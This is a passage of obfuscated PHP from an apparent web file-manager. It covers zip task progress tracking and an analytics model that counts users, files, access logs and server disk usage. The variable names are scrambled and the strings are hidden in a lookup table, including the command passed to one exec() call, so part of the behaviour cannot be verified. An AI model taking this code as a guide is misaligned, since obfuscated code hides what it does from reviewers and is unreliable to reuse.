[$ÕóßŒÂÉ[1864]] = $éÇç„§[$ÕóßŒÂÉ[79]]; $Ó‘¼à [$ÕóßŒÂÉ[1865]] = 0; $Ó‘¼à [$ÕóßŒÂÉ[1164]] = $ÕóßŒÂÉ[1885]; $Ó‘¼à [$ÕóßŒÂÉ[1866]] = $ÕóßŒÂÉ[1309]; $Ó‘¼à [$ÕóßŒÂÉ[853]] = $éÇç„§[$ÕóßŒÂÉ[79]]; $Ó‘¼à [$ÕóßŒÂÉ[1162]] = 1; $“Å¬Ÿ = 0; $Ó‘¼à [$ÕóßŒÂÉ[1873]] = array($ÕóßŒÂÉ[1874] => $“Å¬Ÿ + 1, $ÕóßŒÂÉ[505] => $éÇç„§[$ÕóßŒÂÉ[32]], $ÕóßŒÂÉ[87] => $éÇç„§[$ÕóßŒÂÉ[87]], $ÕóßŒÂÉ[595] => $éÇç„§[$ÕóßŒÂÉ[595]] ? $éÇç„§[$ÕóßŒÂÉ[595]] : $éÇç„§[$ÕóßŒÂÉ[87]]); $this->update(); } public function zipEvent($ˆÎ¡ƒÒ«, $Ë­½—è“, $²¿•ÕŠ, $ÏøŞ„ÈÃ) { $ø¦ı¡À’ =& $_SERVER[Î·Ü›öğ]; $İ­½€¹Ó =& $this->task; $İ­½€¹Ó[$ø¦ı¡À’[1862]] = get_path_this($Ë­½—è“); $İ­½€¹Ó[$ø¦ı¡À’[1864]] = $ÏøŞ„ÈÃ; $İ­½€¹Ó[$ø¦ı¡À’[1865]] = $²¿•ÕŠ; $İ­½€¹Ó[$ø¦ı¡À’[1164]] = $ˆÎ¡ƒÒ« == $ø¦ı¡À’[1933] ? $ø¦ı¡À’[1934] : $ø¦ı¡À’[1935]; $İ­½€¹Ó[$ø¦ı¡À’[1866]] = $ø¦ı¡À’[12]; $İ­½€¹Ó[$ø¦ı¡À’[853]] = $ÏøŞ„ÈÃ; $İ­½€¹Ó[$ø¦ı¡À’[1931]] = $ø¦ı¡À’[390]; $this->update(); } public function unzipAfter($¦ï´ßìÂ) { $éÖ©å† =& $_SERVER[Î·Ü›öğ]; $×€»¦“Ÿ =& $this->task; $×€»¦“Ÿ[$éÖ©å†[1931]] = $éÖ©å†[110]; $ì‘‚¶È = IO::infoWithChildren($¦ï´ßìÂ); $·‰ñ—Õû = 0; $×€»¦“Ÿ[$éÖ©å†[1873]] = array($éÖ©å†[1874] => $·‰ñ—Õû + 1, $éÖ©å†[505] => $ì‘‚¶È[$éÖ©å†[32]], $éÖ©å†[87] => $ì‘‚¶È[$éÖ©å†[87]], $éÖ©å†[595] => $ì‘‚¶È[$éÖ©å†[595]] ? $ì‘‚¶È[$éÖ©å†[595]] : $ì‘‚¶È[$éÖ©å†[87]]); if ($ì‘‚¶È[$éÖ©å†[33]] == $éÖ©å†[233]) { $×€»¦“Ÿ[$éÖ©å†[1162]] = 1; } else { $×€»¦“Ÿ[$éÖ©å†[1162]] = $ì‘‚¶È[$éÖ©å†[82]][$éÖ©å†[80]]; } $×€»¦“Ÿ[$éÖ©å†[1164]] = $éÖ©å†[12]; $×€»¦“Ÿ[$éÖ©å†[1866]] = 0; $×€»¦“Ÿ[$éÖ©å†[1811]] = 0; $×€»¦“Ÿ[$éÖ©å†[1864]] = 0; $×€»¦“Ÿ[$éÖ©å†[1865]] = 0; $×€»¦“Ÿ[$éÖ©å†[1862]] = $éÖ©å†[12]; $×€»¦“Ÿ[$éÖ©å†[1869]] = 0; $×€»¦“Ÿ[$éÖ©å†[853]] = $ì‘‚¶È[$éÖ©å†[79]]; $this->update(); self::log($éÖ©å†[1936] . json_encode(array($×€»¦“Ÿ, $ì‘‚¶È))); } public function nameParse($»Èş•Å) { $£ú›şŒâ =& $_SERVER[Î·Ü›öğ]; $ş…¹Ã§Ş =& $this->task; if ($ş…¹Ã§Ş[$£ú›şŒâ[1931]] == $£ú›şŒâ[1309]) { $ş…¹Ã§Ş[$£ú›şŒâ[1931]] = $£ú›şŒâ[390]; $ş…¹Ã§Ş[$£ú›şŒâ[1869]] = 0; $ş…¹Ã§Ş[$£ú›şŒâ[853]] = 0; } $÷·Úİ„´ = get_path_this($»Èş•Å); if (strstr($÷·Úİ„´, $£ú›şŒâ[10])) { $ş…¹Ã§Ş[$£ú›şŒâ[1811]] += 1; $ş…¹Ã§Ş[$£ú›şŒâ[1162]] += 1; } $ş…¹Ã§Ş[$£ú›şŒâ[1862]] = $»Èş•Å; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ïâî­•´ =& $_SERVER[Î·Ü›öğ]; parent::startAfter(); Hook::bind($ïâî­•´[1937], array($this, $ïâî­•´[1927])); Hook::bind($ïâî­•´[1929], array($this, $ïâî­•´[1930])); $Ü€ğà¹ =& $this->task; $Ü€ğà¹[$ïâî­•´[1931]] = $ïâî­•´[1309]; if (!$Ü€ğà¹[$ïâî­•´[1696]]) { $Ü€ğà¹[$ïâî­•´[1696]] = LNG($ïâî­•´[1938]); } } protected function endAfter() { $‰“¹ÓÒØ =& $_SERVER[Î·Ü›öğ]; parent::endAfter(); Hook::unbind($‰“¹ÓÒØ[1937], array($this, $‰“¹ÓÒØ[1927])); Hook::unbind($‰“¹ÓÒØ[1929], array($this, $‰“¹ÓÒØ[1930])); } public function updateAfter() { $Ì™òÎøÃ =& $_SERVER[Î·Ü›öğ]; $“ŸÖ¢ =& $this->task; if (!$“ŸÖ¢[$Ì™òÎøÃ[1162]] || !$“ŸÖ¢[$Ì™òÎøÃ[853]]) { return; } if ($“ŸÖ¢[$Ì™òÎøÃ[1931]] == $Ì™òÎøÃ[1309]) { $ŠéòÕ”º = $“ŸÖ¢[$Ì™òÎøÃ[1865]]; if ($“ŸÖ¢[$Ì™òÎøÃ[1866]] != $Ì™òÎøÃ[1309]) { $ŠéòÕ”º = 0; } $Îæ ñıÅ = ($“ŸÖ¢[$Ì™òÎøÃ[1869]] + $ŠéòÕ”º) / $“ŸÖ¢[$Ì™òÎøÃ[853]]; $“ŸÖ¢[$Ì™òÎøÃ[1812]] = $Îæ ñıÅ * 0.3; } else { if ($“ŸÖ¢[$Ì™òÎøÃ[1931]] == $Ì™òÎøÃ[390]) { $Îæ ñıÅ = $“ŸÖ¢[$Ì™òÎøÃ[1811]] / $“ŸÖ¢[$Ì™òÎøÃ[1162]]; $“ŸÖ¢[$Ì™òÎøÃ[1812]] = 0.3 + $Îæ ñıÅ * 0.5; } else { if ($“ŸÖ¢[$Ì™òÎøÃ[1931]] == $Ì™òÎøÃ[110]) { $Îæ ñıÅ = 0; if ($“ŸÖ¢[$Ì™òÎøÃ[1864]]) { $Îæ ñıÅ = $“ŸÖ¢[$Ì™òÎøÃ[1865]] / $“ŸÖ¢[$Ì™òÎøÃ[1864]]; } $“ŸÖ¢[$Ì™òÎøÃ[1812]] = 0.3 + 0.5 + $Îæ ñıÅ * 0.2; } } } if ($“ŸÖ¢[$Ì™òÎøÃ[1812]] > 0) { $Øš¥†ùØ = timeFloat() - $“ŸÖ¢[$Ì™òÎøÃ[1814]] - $“ŸÖ¢[$Ì™òÎøÃ[1817]]; $“ŸÖ¢[$Ì™òÎøÃ[1818]] = $Øš¥†ùØ * (1 - $“ŸÖ¢[$Ì™òÎøÃ[1812]]) / $“ŸÖ¢[$Ì™òÎøÃ[1812]]; } } public function copyFileStart($–À¥«æ¨, $ï·ÖË©, $³¶Ô¯°à, $õè½ã©ö, $™ÂÅ³ô, $„ÌèŞä¼) { $öœ˜¸œÎ =& $_SERVER[Î·Ü›öğ]; parent::copyFileStart($–À¥«æ¨, $ï·ÖË©, $³¶Ô¯°à, $õè½ã©ö, $™ÂÅ³ô, $„ÌèŞä¼); $ÑÙ×­œÇ =& $this->task; if ($ÑÙ×­œÇ[$öœ˜¸œÎ[1931]] == $öœ˜¸œÎ[390]) { $ÑÙ×­œÇ[$öœ˜¸œÎ[1931]] = $öœ˜¸œÎ[110]; } $this->update(); } public function copyFileEnd($¥ÉÑ†„, $Á¢Ë„•, $èàŠïıå, $´¥Šïô, $Ö“€’ïñ, $€×ê÷÷) { $ñàİü¬ =& $_SERVER[Î·Ü›öğ]; $ÉÈÅÎ‰¦ =& $this->task; $ÉÈÅÎ‰¦[$ñàİü¬[1865]] = $ÉÈÅÎ‰¦[$ñàİü¬[1864]]; $ÉÈÅÎ‰¦[$ñàİü¬[1869]] += $ÉÈÅÎ‰¦[$ñàİü¬[1864]]; $ÉÈÅÎ‰¦[$ñàİü¬[1866]] = $ñàİü¬[12]; $this->update(); } public function zipEvent($¸§Ü´’Ë, $íûÉÙ‡¡, $ÄÎ¯ÂÖí, $Á‘¡åÚ™) { $×Ì¶ŒÈé =& $_SERVER[Î·Ü›öğ]; $ùØ¾ƒºÂ =& $this->task; $ùØ¾ƒºÂ[$×Ì¶ŒÈé[1862]] = get_path_this($íûÉÙ‡¡); $ùØ¾ƒºÂ[$×Ì¶ŒÈé[1864]] = $Á‘¡åÚ™; $ùØ¾ƒºÂ[$×Ì¶ŒÈé[1865]] = $ÄÎ¯ÂÖí; $ùØ¾ƒºÂ[$×Ì¶ŒÈé[1164]] = $¸§Ü´’Ë == $×Ì¶ŒÈé[1939] ? $×Ì¶ŒÈé[1934] : $×Ì¶ŒÈé[1935]; $ùØ¾ƒºÂ[$×Ì¶ŒÈé[1866]] = $×Ì¶ŒÈé[12]; $ùØ¾ƒºÂ[$×Ì¶ŒÈé[853]] = $Á‘¡åÚ™; $ùØ¾ƒºÂ[$×Ì¶ŒÈé[1931]] = $×Ì¶ŒÈé[390]; $this->update(); } public function nameParse($éò‚™©) { $ÑÈíÙü =& $_SERVER[Î·Ü›öğ]; $ êú«òÁ =& $this->task; if ($ êú«òÁ[$ÑÈíÙü[1811]] < $ êú«òÁ[$ÑÈíÙü[1162]]) { $à¡Ïºêô = get_path_this($éò‚™©); if (strstr($à¡Ïºêô, $ÑÈíÙü[10])) { $ êú«òÁ[$ÑÈíÙü[1811]] += 1; } } if ($ êú«òÁ[$ÑÈíÙü[1931]] == $ÑÈíÙü[1309]) { $ êú«òÁ[$ÑÈíÙü[1931]] = $ÑÈíÙü[390]; } $ êú«òÁ[$ÑÈíÙü[1862]] = $éò‚™©; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($××µ½ú ) { $ÏœŸƒ‹Ä =& $_SERVER[Î·Ü›öğ]; $®ñª—˜Ú = array($ÏœŸƒ‹Ä[678] => array($ÏœŸƒ‹Ä[33] => $ÏœŸƒ‹Ä[1940], $ÏœŸƒ‹Ä[353] => array($ÏœŸƒ‹Ä[285], $ÏœŸƒ‹Ä[855], $ÏœŸƒ‹Ä[1941], $ÏœŸƒ‹Ä[1942])), $ÏœŸƒ‹Ä[1943] => array($ÏœŸƒ‹Ä[33] => $ÏœŸƒ‹Ä[1944], $ÏœŸƒ‹Ä[353] => array($ÏœŸƒ‹Ä[285], $ÏœŸƒ‹Ä[853], $ÏœŸƒ‹Ä[1945], $ÏœŸƒ‹Ä[1946], $ÏœŸƒ‹Ä[1947]))); if (!isset($®ñª—˜Ú[$××µ½ú ])) { return !1; } $this->optionType = $®ñª—˜Ú[$××µ½ú ][$ÏœŸƒ‹Ä[33]]; $this->field = $®ñª—˜Ú[$××µ½ú ][$ÏœŸƒ‹Ä[353]]; return !0; } public function listData($¹ÁÇòªÀ = false, $í¡Ô±å = "\x6d\x6f\144\x69\x66\x79\124\151\x6d\145", $©ˆºÁıö = false) { return parent::listData($¹ÁÇòªÀ, $í¡Ô±å, $©ˆºÁıö); } public function trendList($üûÚÒ±) { $ºø€ÕÉª =& $_SERVER[Î·Ü›öğ]; $ÙÓË³‚¹ = $this->listData(); if ($ÙÓË³‚¹) { $©ìÅË­ñ = end($ÙÓË³‚¹); $Õ‘‚”î¨ = date($ºø€ÕÉª[1948], strtotime($ºø€ÕÉª[1949])); if ($©ìÅË­ñ[$ºø€ÕÉª[285]] == $Õ‘‚”î¨) { return $ÙÓË³‚¹; } $‘èçª—± = strtotime($©ìÅË­ñ[$ºø€ÕÉª[285]]); } if (!isset($‘èçª—±)) { $¦¨ ğ’Å = $üûÚÒ± == $ºø€ÕÉª[678] ? $ºø€ÕÉª[610] : $ºø€ÕÉª[922]; $‘èçª—± = Model($¦¨ ğ’Å)->min($ºø€ÕÉª[234]); } $¯ñí‘Şã = $ºø€ÕÉª[1950] . ucfirst($üûÚÒ±); $ì£Éœœ = $this->dateList($‘èçª—±); foreach ($ì£Éœœ as $Õ‘‚”î¨) { $this->{$¯ñí‘Şã}($Õ‘‚”î¨); } return $this->listData(); } private function dateList($êç³ùğø) { $ö³™ûÊÅ =& $_SERVER[Î·Ü›öğ]; $Šê´•ÓÄ = $êç³ùğø; $ÒÏ©ì¬Ì = strtotime($ö³™ûÊÅ[1949]); $ÅíØ“Âó = array(); while ($Šê´•ÓÄ <= $ÒÏ©ì¬Ì) { $ÅíØ“Âó[] = date($ö³™ûÊÅ[1948], $Šê´•ÓÄ); $Šê´•ÓÄ = strtotime($ö³™ûÊÅ[1951], $Šê´•ÓÄ); } return $ÅíØ“Âó; } public function _recordUser($ç—Ş = '') { $ÄÁöÜ˜Ø =& $_SERVER[Î·Ü›öğ]; $ÂìûˆÅ = strtotime(date($ÄÁöÜ˜Ø[1952], strtotime($ç—Ş))); $à…øÄ¡É = strtotime(date($ÄÁöÜ˜Ø[1953], strtotime($ç—Ş))); $‹ÛÔª¡ = array($ÄÁöÜ˜Ø[234] => array($ÄÁöÜ˜Ø[1112], $à…øÄ¡É)); $Œ©¼Éé = Model($ÄÁöÜ˜Ø[610])->where($‹ÛÔª¡)->count($ÄÁöÜ˜Ø[1810]); $‹ÛÔª¡[$ÄÁöÜ˜Ø[234]] = array($ÄÁöÜ˜Ø[410], array($ÂìûˆÅ, $à…øÄ¡É)); $†î¸Ç¨Á = Model($ÄÁöÜ˜Ø[610])->where($‹ÛÔª¡)->count($ÄÁöÜ˜Ø[1810]); $‹ÛÔª¡[$ÄÁöÜ˜Ø[33]] = $ÄÁöÜ˜Ø[1954]; $«½åŒ‰Ø = Model($ÄÁöÜ˜Ø[1955])->where($‹ÛÔª¡)->count($ÄÁöÜ˜Ø[1956]); $ùø„È¯ = array($ÄÁöÜ˜Ø[285] => $ç—Ş, $ÄÁöÜ˜Ø[855] => (int) $Œ©¼Éé, $ÄÁöÜ˜Ø[1941] => (int) $†î¸Ç¨Á, $ÄÁöÜ˜Ø[1942] => (int) $«½åŒ‰Ø); return $this->insert($ùø„È¯); } public function _recordStore($óáÅÕí = '') { $ã…ë”à =& $_SERVER[Î·Ü›öğ]; $†²ó®¡ = strtotime(date($ã…ë”à[1953], strtotime($óáÅÕí))); $Öø¯ÖƒÓ = array($ã…ë”à[234] => array($ã…ë”à[1112], $†²ó®¡)); $²éÆØ± = Model($ã…ë”à[557])->where($Öø¯ÖƒÓ)->sum($ã…ë”à[79]); $Öø¯ÖƒÓ[$ã…ë”à[496]] = 0; $Ûæºë¤ = Model($ã…ë”à[922])->where($Öø¯ÖƒÓ)->sum($ã…ë”à[79]); $Öø¯ÖƒÓ[$ã…ë”à[191]] = 1; $üÌç³½Á = Model($ã…ë”à[922])->where($Öø¯ÖƒÓ)->sum($ã…ë”à[79]); $Öø¯ÖƒÓ[$ã…ë”à[191]] = 2; $“ˆÆî¨ï = Model($ã…ë”à[922])->where($Öø¯ÖƒÓ)->sum($ã…ë”à[79]); $ØÎîŸ§Ù = array($ã…ë”à[285] => $óáÅÕí, $ã…ë”à[853] => (int) $Ûæºë¤, $ã…ë”à[1945] => (int) $²éÆØ±, $ã…ë”à[1946] => (int) $üÌç³½Á, $ã…ë”à[1947] => (int) $“ˆÆî¨ï); return $this->insert($ØÎîŸ§Ù); } public function trend($¶û¬‰¤, $ëı×§‹õ) { $œ…íØù =& $_SERVER[Î·Ü›öğ]; if (!$this->init($¶û¬‰¤)) { return !1; } $Ìş„öä = $this->trendList($¶û¬‰¤); if ($Ìş„öä && $ëı×§‹õ != $œ…íØù[1782]) { $ÌÏ¼„Ò = $Ìş„öä[0][$œ…íØù[285]]; $Æö¢¾À³ = $this->validDate($ëı×§‹õ, $ÌÏ¼„Ò); $ÎúÕ‘ = array(); $ò§òğÈ© = array_to_keyvalue($Ìş„öä, $œ…íØù[285]); foreach ($Æö¢¾À³ as $Ş¡çË¾Œ) { if (isset($ò§òğÈ©[$Ş¡çË¾Œ])) { $–Ü‚ÂŠ† = $ò§òğÈ©[$Ş¡çË¾Œ]; } else { $–Ü‚ÂŠ† = end($Ìş„öä); $–Ü‚ÂŠ†[$œ…íØù[285]] = $Ş¡çË¾Œ; if ($¶û¬‰¤ == $œ…íØù[678]) { $–Ü‚ÂŠ†[$œ…íØù[1941]] = $–Ü‚ÂŠ†[$œ…íØù[1942]] = 0; } } $ÎúÕ‘[] = $–Ü‚ÂŠ†; } $Ìş„öä = $ÎúÕ‘; } $öäÒİÕí = array($œ…íØù[678] => array($œ…íØù[855] => LNG($œ…íØù[1957]), $œ…íØù[1941] => LNG($œ…íØù[1958]), $œ…íØù[1942] => LNG($œ…íØù[1959])), $œ…íØù[1943] => array($œ…íØù[853] => LNG($œ…íØù[1960]), $œ…íØù[1945] => LNG($œ…íØù[1961]), $œ…íØù[1946] => LNG($œ…íØù[1962]), $œ…íØù[1947] => LNG($œ…íØù[1963]))); $“úÆÌæ = array($œ…íØù[678] => $œ…íØù[1964], $œ…íØù[1943] => $œ…íØù[79]); if (empty($Ìş„öä)) { $Ş¡çË¾Œ = date($œ…íØù[1948], strtotime($œ…íØù[1949])); $—à¾‚Ä = array($œ…íØù[285] => $Ş¡çË¾Œ); foreach ($öäÒİÕí[$¶û¬‰¤] as $ı¿òŞ¨è => $öÈÉ²£¨) { $—à¾‚Ä[$ı¿òŞ¨è] = 0; } $Ìş„öä[] = $—à¾‚Ä; } $ïıûª‘‡ = array(); foreach ($Ìş„öä as $öÈÉ²£¨) { if ($¶û¬‰¤ == $œ…íØù[1943] && $öÈÉ²£¨[$œ…íØù[1945]] > $öÈÉ²£¨[$œ…íØù[853]]) { $öÈÉ²£¨[$œ…íØù[1945]] = $öÈÉ²£¨[$œ…íØù[853]]; } foreach ($öäÒİÕí[$¶û¬‰¤] as $ı¿òŞ¨è => $ê¶Éäêù) { $–Ü‚ÂŠ† = array($œ…íØù[285] => $öÈÉ²£¨[$œ…íØù[285]], $œ…íØù[1696] => $ê¶Éäêù); $–Ü‚ÂŠ†[$“úÆÌæ[$¶û¬‰¤]] = isset($öÈÉ²£¨[$ı¿òŞ¨è]) ? $öÈÉ²£¨[$ı¿òŞ¨è] : 0; $ïıûª‘‡[] = $–Ü‚ÂŠ†; } } return $ïıûª‘‡; } public function validDate($£·ƒÆ½´, $¯Õ™Ş†Ï) { $ò‘½ÈÁ¨ =& $_SERVER[Î·Ü›öğ]; $‹­Œàó = date($ò‘½ÈÁ¨[1948], strtotime($ò‘½ÈÁ¨[1949])); $õ¯°ª¬” = array($‹­Œàó); switch ($£·ƒÆ½´) { case $ò‘½ÈÁ¨[1789]: $³ËÆÍ¡â = mktime(0, 0, 0, date($ò‘½ÈÁ¨[1965]), date($ò‘½ÈÁ¨[1489]) - date($ò‘½ÈÁ¨[1578]) + 7 - 7, date($ò‘½ÈÁ¨[1966])); $•Ÿïã ¾ = 0; do { $¡­î³±ø = date($ò‘½ÈÁ¨[1948], $³ËÆÍ¡â - 3600 * 24 * 7 * $•Ÿïã ¾); $õ¯°ª¬”[] = $¡­î³±ø; $•Ÿïã ¾++; } while ($¯Õ™Ş†Ï < $¡­î³±ø); break; case $ò‘½ÈÁ¨[1787]: $•Ÿïã ¾ = 1; do { $ÏÀÕÁßˆ = date($ò‘½ÈÁ¨[1967], strtotime("\55\x20{$•Ÿïã ¾}\x20\x6d\x6f\156\x74\x68\x73")); $õ¯°ª¬”[] = $ÏÀÕÁßˆ; $•Ÿïã ¾++; } while ($¯Õ™Ş†Ï < $ÏÀÕÁßˆ); break; case $ò‘½ÈÁ¨[1968]: $¦¿·†Ú¾ = (int) date($ò‘½ÈÁ¨[1966], strtotime($¯Õ™Ş†Ï)); $È–£Û€ = (int) date($ò‘½ÈÁ¨[1966]); if ($¦¿·†Ú¾ >= $È–£Û€) { break; } for ($¦¿·†Ú¾; $¦¿·†Ú¾ < $È–£Û€; $¦¿·†Ú¾++) { $õ¯°ª¬”[] = $¦¿·†Ú¾ . $ò‘½ÈÁ¨[1969]; } break; default: break; } if ($¯Õ™Ş†Ï > end($õ¯°ª¬”)) { array_pop($õ¯°ª¬”); } sort($õ¯°ª¬”); return $õ¯°ª¬”; } public function listTable($§Î¼üğá) { $½ü¿Î¦Ÿ = ucfirst($§Î¼üğá); return Model($½ü¿Î¦Ÿ)->listData(); } public function option($²œÛ€) { $íÜûìƒ = $_SERVER[Î·Ü›öğ][1970] . ucfirst($²œÛ€); return $this->{$íÜûìƒ}(); } private function optionUser() { $ÊÇÓ±ÆÓ =& $_SERVER[Î·Ü›öğ]; $Ç‚»°² = Model($ÊÇÓ±ÆÓ[610])->count($ÊÇÓ±ÆÓ[1810]); $Ô”œĞĞ = Model($ÊÇÓ±ÆÓ[610])->where($ÊÇÓ±ÆÓ[1971])->count($ÊÇÓ±ÆÓ[1810]); $¿íâ£ëš = intval($GLOBALS[$ÊÇÓ±ÆÓ[6]][$ÊÇÓ±ÆÓ[426]][$ÊÇÓ±ÆÓ[1755]]) / 3600; $£èôƒ = strtotime("\x2d{$¿íâ£ëš}\x20\x68\157\165\162\163"); $“­æé»‰ = strtotime(date($ÊÇÓ±ÆÓ[1952])); if ($£èôƒ < $“­æé»‰) { $£èôƒ = $“­æé»‰; } $®¦ø§›€ = array($ÊÇÓ±ÆÓ[1972] => array($ÊÇÓ±ÆÓ[1113], $£èôƒ)); $€ôñŸ£ğ = (int) Model($ÊÇÓ±ÆÓ[610])->where($®¦ø§›€)->count($ÊÇÓ±ÆÓ[1810]); if (!$€ôñŸ£ğ) { $€ôñŸ£ğ = 1; } $®¦ø§›€ = array($ÊÇÓ±ÆÓ[1972] => array($ÊÇÓ±ÆÓ[1113], $“­æé»‰)); $ì‘ªÛÚ§ = Model($ÊÇÓ±ÆÓ[610])->where($®¦ø§›€)->count($ÊÇÓ±ÆÓ[1810]); return array($ÊÇÓ±ÆÓ[848] => (int) $Ç‚»°², $ÊÇÓ±ÆÓ[1973] => (int) ($Ç‚»°² - $Ô”œĞĞ), $ÊÇÓ±ÆÓ[1974] => (int) $Ô”œĞĞ, $ÊÇÓ±ÆÓ[1975] => (int) $ì‘ªÛÚ§, $ÊÇÓ±ÆÓ[1976] => $€ôñŸ£ğ); } private function optionFile() { $ÂÃ¦„Í¶ =& $_SERVER[Î·Ü›öğ]; $ÄÜÀ© = $this->sourceSize(); $¶ñ„ğ–ü = $ÄÜÀ©[$ÂÃ¦„Í¶[79]]; $áÒ¢˜ê“ = $ÄÜÀ©[$ÂÃ¦„Í¶[1945]]; $”˜ğşÌ¿ = Model($ÂÃ¦„Í¶[922])->where(array($ÂÃ¦„Í¶[496] => 0))->count($ÂÃ¦„Í¶[194]); $ÃìÅñò‚ = array($ÂÃ¦„Í¶[496] => 0, $ÂÃ¦„Í¶[234] => array($ÂÃ¦„Í¶[1113], strtotime(date($ÂÃ¦„Í¶[1952])))); $äàïãæİ = Model($ÂÃ¦„Í¶[922])->where($ÃìÅñò‚)->sum($ÂÃ¦„Í¶[79]); $«¸î– = Model($ÂÃ¦„Í¶[922])->where($ÃìÅñò‚)->count($ÂÃ¦„Í¶[194]); return array($ÂÃ¦„Í¶[853] => $¶ñ„ğ–ü, $ÂÃ¦„Í¶[1945] => $áÒ¢˜ê“, $ÂÃ¦„Í¶[1977] => $¶ñ„ğ–ü - $áÒ¢˜ê“, $ÂÃ¦„Í¶[1978] => (int) $äàïãæİ, $ÂÃ¦„Í¶[855] => (int) $”˜ğşÌ¿, $ÂÃ¦„Í¶[1979] => (int) $«¸î–); } private function optionAccess() { $Ä‰Ò¨°° =& $_SERVER[Î·Ü›öğ]; return array($Ä‰Ò¨°°[848] => $this->typeLogCnt(), $Ä‰Ò¨°°[110] => $this->typeLogCnt($Ä‰Ò¨°°[110]), $Ä‰Ò¨°°[536] => $this->typeLogCnt($Ä‰Ò¨°°[536]), $Ä‰Ò¨°°[1257] => $this->typeLogCnt($Ä‰Ò¨°°[1257]), $Ä‰Ò¨°°[1980] => $this->typeLogCnt($Ä‰Ò¨°°[1980]), $Ä‰Ò¨°°[678] => $this->typeLogCnt($Ä‰Ò¨°°[12], $Ä‰Ò¨°°[1956])); } private function typeLogCnt($›†ÌìÅ = '', $›òÁƒ¾» = "\151\144") { $–öğÖ =& $_SERVER[Î·Ü›öğ]; $ã„š™Ôˆ = array($–öğÖ[110] => array($–öğÖ[1981], $–öğÖ[1982]), $–öğÖ[536] => array($–öğÖ[1983], $–öğÖ[1984]), $–öğÖ[1257] => array($–öğÖ[1985], $–öğÖ[1986], $–öğÖ[1987]), $–öğÖ[1980] => array($–öğÖ[1988], $–öğÖ[1989]), $–öğÖ[1990] => array($–öğÖ[1991], $–öğÖ[1992], $–öğÖ[1993])); $Áâè³ˆ· = strtotime(date($–öğÖ[1952])); $ûßëÖæÕ = array($–öğÖ[234] => array($–öğÖ[1113], $Áâè³ˆ·)); if ($›†ÌìÅ) { $ûßëÖæÕ[$–öğÖ[33]] = array($–öğÖ[7], $ã„š™Ôˆ[$›†ÌìÅ]); } $ª£Ï“ÁÏ = Model($–öğÖ[1955])->where($ûßëÖæÕ)->count($›òÁƒ¾»); return (int) $ª£Ï“ÁÏ; } private function optionServer() { $†¬ƒ¶üÀ =& $_SERVER[Î·Ü›öğ]; $…ÆØã”ó = $this->diskDriver(); $£ĞïËÜŸ = KodIO::defaultDriver(); $‹­•„Ÿ€ = array($†¬ƒ¶üÀ[915] => $£ĞïËÜŸ[$†¬ƒ¶üÀ[477]]); $¢¾¯¨ÙØ = Model($†¬ƒ¶üÀ[557])->where($‹­•„Ÿ€)->sum($†¬ƒ¶üÀ[79]); $™åÃÆé = explode($†¬ƒ¶üÀ[53], $_SERVER[$†¬ƒ¶üÀ[147]]); $ùÆ»éç = $™åÃÆé[0]; $İÁüÄÈ = $GLOBALS[$†¬ƒ¶üÀ[6]][$†¬ƒ¶üÀ[21]]; $šüæşÇÛ = $İÁüÄÈ[$†¬ƒ¶üÀ[1075]]; if ($šüæşÇÛ == $†¬ƒ¶üÀ[1063]) { $³İ¯¦Ä± = explode($†¬ƒ¶üÀ[1398], $İÁüÄÈ[$†¬ƒ¶üÀ[1074]]); $šüæşÇÛ = $³İ¯¦Ä±[0]; } if ($šüæşÇÛ == $†¬ƒ¶üÀ[1011] || $šüæşÇÛ == $†¬ƒ¶üÀ[900]) { $ÛŞ²ù±– = Model()->db()->query($†¬ƒ¶üÀ[1994]); $·û Ó¶µ = $ÛŞ²ù±–[0] && isset($ÛŞ²ù±–[0][$†¬ƒ¶üÀ[1695]]) ? $ÛŞ²ù±–[0][$†¬ƒ¶üÀ[1695]] : 0; $šüæşÇÛ = $†¬ƒ¶üÀ[1995] . ($·û Ó¶µ ? $†¬ƒ¶üÀ[8] . $·û Ó¶µ : $†¬ƒ¶üÀ[12]); } $ç ÅÒ = $GLOBALS[$†¬ƒ¶üÀ[6]][$†¬ƒ¶üÀ[426]][$†¬ƒ¶üÀ[924]]; return array($†¬ƒ¶üÀ[1996] => $…ÆØã”ó ? $…ÆØã”ó[$†¬ƒ¶üÀ[1997]] : 0, $†¬ƒ¶üÀ[1998] => $…ÆØã”ó ? $…ÆØã”ó[$†¬ƒ¶üÀ[1999]] : 0, $†¬ƒ¶üÀ[2000] => (int) $£ĞïËÜŸ[$†¬ƒ¶üÀ[1997]] * 1024 * 1024 * 1024, $†¬ƒ¶üÀ[2001] => (int) $¢¾¯¨ÙØ, $†¬ƒ¶üÀ[2002] => ucfirst($ùÆ»éç), $†¬ƒ¶üÀ[2003] => $†¬ƒ¶üÀ[2004] . PHP_VERSION, $†¬ƒ¶üÀ[2005] => phpBuild64() ? 64 : 32, $†¬ƒ¶üÀ[847] => str_replace($†¬ƒ¶üÀ[1238], $†¬ƒ¶üÀ[1091], $šüæşÇÛ), $†¬ƒ¶üÀ[426] => ucfirst($ç ÅÒ), $†¬ƒ¶üÀ[32] => $_SERVER[$†¬ƒ¶üÀ[2006]]); } private function diskDriver() { $ñ±æ±ÚŞ =& $_SERVER[Î·Ü›öğ]; $áˆĞ×û = $ñ±æ±ÚŞ[8]; $ŞİËÛ·ï = $GLOBALS[$ñ±æ±ÚŞ[6]][$ñ±æ±ÚŞ[1422]] == $ñ±æ±ÚŞ[1423]; if ($ŞİËÛ·ï) { $áˆĞ×û = $ñ±æ±ÚŞ[2007]; if (function_exists($ñ±æ±ÚŞ[2008])) { exec($ñ±æ±ÚŞ[2009], $‘ÊİÙÙ¦); $áˆĞ×û = $‘ÊİÙÙ¦[1] . $ñ±æ±ÚŞ[8]; } } if (!file_exists($áˆĞ×û)) { return; } if (!function_exists($ñ±æ±ÚŞ[2010])) { return; } $íûÃ±áÒ = @disk_total_space($áˆĞ×û); $ğ·Ûñ´Ş = $íûÃ±áÒ - @disk_free_space($áˆĞ×û); return array($ñ±æ±ÚŞ[1997] => $íûÃ±áÒ, $ñ±æ±ÚŞ[1999] => $ğ·Ûñ´Ş); } public function fileChart($õÓèÀô) { $—–úéŠï =& $_SERVER[Î·Ü›öğ]; if (isset($õÓèÀô[$—–úéŠï[1810]])) { return Model($—–úéŠï[922])->userFileTypeProfile($õÓèÀô[$—–úéŠï[1810]]); } if (isset($õÓèÀô[$—–úéŠï[1420]])) { return Model($—–úéŠï[922])->groupFileTypeProfile($õÓèÀô[$—–úéŠï[1420]]); } $ÉÕ»ŒÃŞ = $this->sourceSize(); 